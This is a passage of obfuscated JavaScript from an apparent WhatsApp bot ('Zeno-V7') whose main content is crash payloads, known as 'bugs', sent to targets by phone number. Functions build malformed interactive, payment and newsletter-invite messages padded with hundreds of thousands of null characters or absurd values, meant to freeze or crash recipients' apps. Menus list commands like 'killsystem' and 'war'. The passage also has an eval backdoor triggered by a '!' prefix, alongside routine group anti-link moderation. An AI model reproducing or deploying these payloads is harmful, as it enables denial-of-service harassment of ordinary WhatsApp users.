              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
              body: "Bug ui by © Drayxd",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "x",
              mediaUrl: "x",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "‎ ‎ "
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, _0x269db0 ? {
        participant: {
          jid: _0x5981ab
        }
      } : {});
      console.log(chalk.red("ZENO SEND BUG¿"));
    }
    ;
    _0x554af5.sendButtonVideo = async (_0x1a8436, _0x556733, _0x3df452, _0x104e76 = {}) => {
      var _0x1c58e1 = await prepareWAMessageMedia({
        video: {
          url: _0x104e76 && _0x104e76.video ? _0x104e76.video : ""
        }
      }, {
        upload: _0x554af5.waUploadToServer
      });
      let _0xeeba20 = generateWAMessageFromContent(_0x1a8436, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: _0x104e76 && _0x104e76.body ? _0x104e76.body : ""
              },
              footer: {
                text: _0x104e76 && _0x104e76.footer ? _0x104e76.footer : ""
              },
              header: {
                hasMediaAttachment: true,
                videoMessage: _0x1c58e1.videoMessage
              },
              nativeFlowMessage: {
                buttons: _0x556733,
                messageParamsJson: ""
              },
              contextInfo: {
                externalAdReply: {
                  title: global.namabot,
                  body: "𝐙𝐞𝐧𝐨 𝐍𝐞𝐰 𝐄𝐫𝐚",
                  thumbnailUrl: global.imageurl,
                  sourceUrl: global.isLink,
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      }, {
        quoted: _0x3df452
      });
      await _0x554af5.sendPresenceUpdate("composing", _0x1a8436);
      return _0x554af5.relayMessage(_0x1a8436, _0xeeba20.message, {
        messageId: _0xeeba20.key.id
      });
    };
    async function _0x1d45c3(_0x5d40a4, _0x5c7fc9, _0x327e84, _0x28ac44, _0x8124c6, _0x11a765, _0x5a9b3f, _0xa0a78e) {
      var _0x13e82b = generateWAMessageFromContent(_0x5d40a4, proto.Message.fromObject({
        qp: {
          filter: {
            filterName: _0x5c7fc9,
            parameters: _0x327e84,
            filterResult: _0x28ac44,
            clientNotSupportedConfig: _0x8124c6
          },
          filterClause: {
            clauseType: _0x11a765,
            clauses: _0x5a9b3f,
            filters: _0xa0a78e
          }
        }
      }), {
        userJid: _0x5d40a4
      });
      await _0x554af5.relayMessage(_0x5d40a4, _0x13e82b.message, {
        participant: {
          jid: _0x5d40a4
        },
        messageId: _0x13e82b.key.id
      });
    }
    async function _0x2b1975(_0x408a91, _0x330f71, _0x240b85, _0x1740ca, _0x44537d, _0x206b33, _0x41964b, _0x5905ab, _0x18822c, _0x30b7a6, _0x1cc877, _0x584f22, _0x6af982, _0x2bf743) {
      var _0x1f673c = generateWAMessageFromContent(_0x408a91, proto.Message.fromObject({
        sessionStructure: {
          sessionVersion: _0x330f71,
          localIdentityPublic: _0x240b85,
          remoteIdentityPublic: _0x1740ca,
          rootKey: _0x44537d,
          previousCounter: _0x206b33,
          senderChain: _0x41964b,
          receiverChains: _0x5905ab,
          pendingKeyExchange: _0x18822c,
          pendingPreKey: _0x30b7a6,
          remoteRegistrationId: _0x1cc877,
          localRegistrationId: _0x584f22,
          needsRefresh: _0x6af982,
          aliceBaseKey: _0x2bf743
        }
      }), {
        userJid: _0x408a91
      });
      await _0x554af5.relayMessage(_0x408a91, _0x1f673c.message, {
        participant: {
          jid: _0x408a91
        },
        messageId: _0x1f673c.key.id
      });
    }
    async function _0x2ed17d(_0x5eeb00, _0x144aa5) {
      let _0x45a7e3 = await generateWAMessageFromContent(_0x5eeb00, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "kontol"
              },
              header: {
                hasMediaAttachment: false,
                locationMessage: {}
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x5eeb00,
        quoted: _0x144aa5
      });
    }
    const _0x2f9e93 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function _0x4003b8(_0x3fbda3, _0x15142c, _0x36b71e) {
      let _0x5b1fb2 = await generateWAMessageFromContent(_0x3fbda3, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Sent",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ModsExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@Akmal.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(_0x36b71e) + "\",\"screen_0_TextInput_1\":\"∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }), {
        userJid: _0x3fbda3,
        quoted: _0x15142c
      });
    }
    async function _0x39e57c(_0x4ae301) {
      var _0x16c47f = generateWAMessageFromContent(_0x4ae301, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0x26ef70 + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      _0x554af5.relayMessage(_0x4ae301, _0x16c47f.message, {
        messageId: _0x16c47f.key.id
      });
    }
    async function _0x114e3f(_0x469c85) {
      var _0x34b59f = generateWAMessageFromContent(_0x469c85, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "𝐙𝐄𝐍𝐎 𝐍𝐄𝐖 𝐄𝐑𝐀" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Undangan Admin Bokep",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: _0x469c85
      });
      await _0x554af5.relayMessage(_0x469c85, _0x34b59f.message, {
        participant: {
          jid: _0x469c85
        },
        messageId: _0x34b59f.key.id
      });
    }
    const _0x121a88 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x5dd2ef.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./zeno/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐞𝐧𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x45d3b6 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x5dd2ef.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        listResponseMessage: {
          title: "∗🚷▸⃟°̯͜𝐙∑⋂⨀ 𝐀𝐍𝐓𝐈 𝐊𝐑𝐎𝐂𝐎 ༑ ⃟̶̽♨️"
        }
      }
    };
    const _0x2dd753 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x5dd2ef.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./zeno/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐞𝐧𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    let _0x170823 = [];
    for (let _0x393820 of _0x259e8b) {
      _0x170823.push({
        displayName: await _0x554af5.getName(_0x393820 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x554af5.getName(_0x393820 + "@s.whatsapp.net")) + "\n\nFN:dray\n\nitem1.TEL;waid=" + _0x393820 + ":" + _0x393820 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET:drayoffc@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:bit.ly/Drayotomatis\n\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;DrayXD Official;;;;\n\nitem4.X-ABLabel:Session 1\n\nEND:VCARD"
      });
    }
    if (_0x311125 && _0x5dd2ef.msg.fileSha256 && _0x5dd2ef.msg.fileSha256.toString("base64") in global.db.data.sticker) {
      let _0x57330e = global.db.data.sticker[_0x5dd2ef.msg.fileSha256.toString("base64")];
      let {
        text: _0x4ddc26,
        mentionedJid: _0x150fc2
      } = _0x57330e;
      let _0x543889 = await generateWAMessage(_0x2f68f6, {
        text: _0x4ddc26,
        mentions: _0x150fc2
      }, {
        userJid: _0x554af5.user.id,
        quoted: _0x5dd2ef.quoted && _0x5dd2ef.quoted.fakeObj
      });
      _0x543889.key.fromMe = areJidsSameUser(_0x5dd2ef.sender, _0x554af5.user.id);
      _0x543889.key.id = _0x5dd2ef.key.id;
      _0x543889.pushName = _0x5dd2ef.pushName;
      if (_0x5dd2ef.isGroup) {
        _0x543889.participant = _0x5dd2ef.sender;
      }
      let _0x50a375 = {
        ..._0x272fda,
        messages: [proto.WebMessageInfo.fromObject(_0x543889)],
        type: "append"
      };
      _0x554af5.ev.emit("messages.upsert", _0x50a375);
    }
    if (_0x349f58.startsWith("!")) {
      try {
        return _0x3f20c7(JSON.stringify(eval("" + _0x1d31fd.join(" ")), null, "\t"));
      } catch (_0x416951) {
        _0x3f20c7(_0x416951);
      }
    }
    if (_0x4f4df0) {
      if (_0x349f58.match("chat.whatsapp.com")) {
        _0x5dd2ef.reply("*「 ANTI LINK 」*\n\nLink grup detected, maaf kamu akan di kick !");
        if (!_0x5c5d5c) {
          return _0x5dd2ef.reply("Upsss... gajadi, bot bukan admin");
        }
        let _0x16d954 = "https://chat.whatsapp.com/" + (await _0x554af5.groupInviteCode(_0x5dd2ef.chat));
        let _0x40dce3 = new RegExp(_0x16d954, "i");
        let _0x2e42e9 = _0x40dce3.test(_0x5dd2ef.text);
        if (_0x2e42e9) {
          return _0x5dd2ef.reply("Upsss... gak jadi, untung link gc sendiri");
        }
        if (_0x58e970) {
          return _0x5dd2ef.reply("Upsss... gak jadi, kasian adminnya klo di kick");
        }
        if (_0x439cd6) {
          return _0x5dd2ef.reply("Upsss... gak jadi, kasian owner ku klo di kick");
        }
        if (_0x5dd2ef.key.fromMe) {
          return _0x5dd2ef.reply("Upsss... gak jadi, kasian owner ku klo di kick");
        }
        await _0x554af5.sendMessage(_0x5dd2ef.chat, {
          delete: {
            remoteJid: _0x5dd2ef.chat,
            fromMe: false,
            id: _0x5dd2ef.key.id,
            participant: _0x5dd2ef.key.participant
          }
        });
        _0x554af5.groupParticipantsUpdate(_0x5dd2ef.chat, [_0x5dd2ef.sender], "remove");
      }
    }
    if (_0x5a3bab) {
      if (_0x349f58.match("chat.whatsapp.com")) {
        if (!_0x5c5d5c) {
          return;
        }
        let _0x21427d = "https://chat.whatsapp.com/" + (await _0x554af5.groupInviteCode(_0x5dd2ef.chat));
        let _0x521180 = new RegExp(_0x21427d, "i");
        let _0x2c712f = _0x521180.test(_0x5dd2ef.text);
        if (_0x2c712f) {
          return;
        }
        if (_0x58e970) {
          return;
        }
        if (_0x1e7bc9) {
          return;
        }
        if (_0x5dd2ef.key.fromMe) {
          return;
        }
        await _0x554af5.sendMessage(_0x5dd2ef.chat, {
          delete: {
            remoteJid: _0x5dd2ef.chat,
            fromMe: false,
            id: _0x5dd2ef.key.id,
            participant: _0x5dd2ef.key.participant
          }
        });
      }
    }
    if (_0x2d3822) {
      if (_0x349f58.match("chat.whatsapp.com")) {
        _0x5dd2ef.reply(autojpmm + "\n");
        let _0xc53ec0 = "https://chat.whatsapp.com/";
        let _0x5d4052 = new RegExp(_0xc53ec0, "i");
        let _0x101d27 = _0x5d4052.test(_0x5dd2ef.text);
        await _0x554af5.sendMessage(_0x5dd2ef.chat, {
          delete: {
            remoteJid: _0x5dd2ef.chat,
            fromMe: false,
            id: _0x5dd2ef.key.id,
            participant: _0x5dd2ef.key.participant
          }
        });
      }
    }
    switch (_0x3c8344) {
      case "menu":
        {
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            react: {
              text: "🩸",
              key: _0x5dd2ef.key
            }
          });
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            react: {
              text: "🔪",
              key: _0x5dd2ef.key
            }
          });
          let _0x4f683f = await prepareWAMessageMedia({
            image: _0x5921de
          }, {
            upload: _0x554af5.waUploadToServer
          });
          const _0x528ef2 = await generateWAMessageFromContent(_0x5dd2ef.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: "𝐙𝐞𝐧𝐨-𝐕𝟕↯\n> © DrayXD"
                  }),
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [{
                      body: proto.Message.InteractiveMessage.Body.fromObject({}),
                      footer: proto.Message.InteractiveMessage.Footer.fromObject({}),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "\n╭⫸ ⟬     𝐙𝐄𝐍𝐎    -    𝐕𝟕     ⟭ ⫷╮\n║↝ 𝕹𝖆𝖒𝖆 𝕭𝖔𝖙    : 𝐙𝐄𝐍𝐎-𝐕𝟕\n║↝ 𝖁𝖊𝖗𝖘𝖎𝖔𝖓        : 𝟕.𝟎\n║↝ 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗     : 𝐃𝐫𝐚𝐲𝐗𝐃\n║↝ 𝕺𝖜𝖓𝖊𝖗           : " + global.namaowner + "\n║ ➥ ᑲᥙᥡ sᥴrі⍴𝗍? bit.ly/Drayotomatis\n╰⪩｟   𝖅𝖊𝖓𝖔 𝕹𝖔 𝕮𝖔𝖚𝖓𝖙𝖊𝖗  ｠⪨╯\n\n*⚠️𝕹𝖔𝖙𝖊 : Use this AI as wisely as possible, do not be abused*\n\n╭≫ 🗡 𝐒𝐞𝐥𝐞𝐜𝐭 𝐌𝐞𝐧𝐮 🗡\n> ⚡︎ ᴀʟʟᴍᴇɴᴜ\n> ⚡︎ ʙᴜɢᴍᴇɴᴜ\n╰──────✧˙\n\n╭━━ᕗ 𝗕𝗜𝗚 𝗧𝗛𝗔𝗡𝗞𝗦 \n┃彡 𝐃𝐫𝐚𝐲𝐗𝐃\n┃彡 𝐏𝐚𝐞𝐝𝐮𝐥𝐳\n┃彡 𝐏𝐚𝐫𝐭𝐧𝐞𝐫 𝐂𝐲𝐯𝐚\n┃彡 𝐏𝐚𝐫𝐭𝐧𝐞𝐫 𝐉𝐨𝐧𝐢\n┃彡 𝐋𝐮𝐱𝐱𝐲\n┃彡 𝐀𝐥𝐥 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐬𝐜𝐫𝐢𝐩𝐭.\n╰━━━━━━━━━━━━✠\n",
                        hasMediaAttachment: true,
                        ...(await prepareWAMessageMedia({
                          image: _0x5921de
                        }, {
                          upload: _0x554af5.waUploadToServer
                        }))
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x5dd2ef.sender,
            quoted: _0x5dd2ef
          });
          await _0x554af5.relayMessage(_0x5dd2ef.chat, _0x528ef2.message, {
            messageId: _0x528ef2.key.id
          });
          await sleep(1500);
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            audio: _0x5cdd11,
            mimetype: "audio/mp4",
            ptt: true
          });
        }
        break;
      case "bugmenu":
        {
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            react: {
              text: "🗡",
              key: _0x5dd2ef.key
            }
          });
          let _0x57e715 = await prepareWAMessageMedia({
            image: fs.readFileSync("./zeno/zam.jpg")
          }, {
            upload: _0x554af5.waUploadToServer
          });
          let _0x3fb6f8 = await prepareWAMessageMedia({
            image: fs.readFileSync("./zeno/zam.jpg")
          }, {
            upload: _0x554af5.waUploadToServer
          });
          const _0x2aa5dd = await generateWAMessageFromContent(_0x5dd2ef.chat, {
            ephemeralMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: "𝐙𝐞𝐧𝐨-𝐕𝟕↯\n> © DrayXD"
                  }),
                  contextInfo: {
                    isForwarded: false
                  },
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [{
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐁𝐔𝐆 𝐙𝐄𝐍𝐎 ⌟\n> ᴢᴇɴᴏᴠ1 62xxxx\n> ᴢᴇɴᴏᴠ2 62xxxx\n> ᴢᴇɴᴏᴠ3 62xxxx \n> ᴢᴇɴᴏᴠ4 62xxxx \n> ᴢᴇɴᴏᴠ5 62xxxx\n> ᴢᴇɴᴏᴠ6 62xxxx \n> ᴢᴇɴᴏᴠ7 62xxxx \n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x3fb6f8
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐁𝐔𝐆 𝐔𝐈 ⌟\n> ʜɪᴛᴀᴍ 62xxxx\n> ᴘʀɪᴢ 62xxxx\n> ʙʟᴀɴᴋ 62xxxx \n> ᴋɪʟʟsʏsᴛᴇᴍ 62xxxx \n> ʜᴀɴᴄᴜʀᴋᴀɴ 62xxxx\n> ᴊɪᴅ 62xxxx \n> ᴋɪʟʟ 62xxxx \n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x3fb6f8
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐁𝐔𝐆 𝐖𝐀𝐑 ⌟\n> ᴡᴀʀ1 62xxxx\n> ᴡᴀʀ2 62xxxx\n> ᴡᴀʀ3 62xxxx \n> ᴡᴀʀ4 62xxxx \n> ᴡᴀʀ5 62xxxx\n> ᴡᴀʀ6 62xxxx \n> ᴡᴀʀ7 62xxxx \n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x3fb6f8
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x5dd2ef.sender,
            quoted: _0x5dd2ef
          });
          await _0x554af5.relayMessage(_0x5dd2ef.chat, _0x2aa5dd.message, {
            messageId: _0x2aa5dd.key.id
          });
          await sleep(1500);
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            audio: _0x5cdd11,
            mimetype: "audio/mp4",
            ptt: true
          });
        }
        break;
      case "allmenu":
        {
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            react: {
              text: "🗡",
              key: _0x5dd2ef.key
            }
          });
          let _0x34c393 = await prepareWAMessageMedia({
            image: fs.readFileSync("./zeno/zam.jpg")
          }, {
            upload: _0x554af5.waUploadToServer
          });
          let _0x37ae68 = await prepareWAMessageMedia({
            image: fs.readFileSync("./zeno/zam.jpg")
          }, {
            upload: _0x554af5.waUploadToServer
          });
          const _0x506d86 = await generateWAMessageFromContent(_0x5dd2ef.chat, {
            ephemeralMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: "𝐙𝐞𝐧𝐨-𝐕𝟕↯\n> © DrayXD"
                  }),
                  contextInfo: {
                    isForwarded: false
                  },
                  carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [{
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ⌟\n> addmurbug 62xxxx\n> dellmurbug 62xxxx\n> addgcmurbug\n> dellgcmurbug\n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x37ae68
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 ⌟\n> addgcseller\n> addseller\n> delseller\n> addpt\n> delpt\n> addown\n> delown\n> panel\n> listusr\n> delusr\n> listsrv\n> delsrv\n> ramlist\n> addusr\n> addsrv\n> cadmin\n> listadmin\n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x37ae68
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
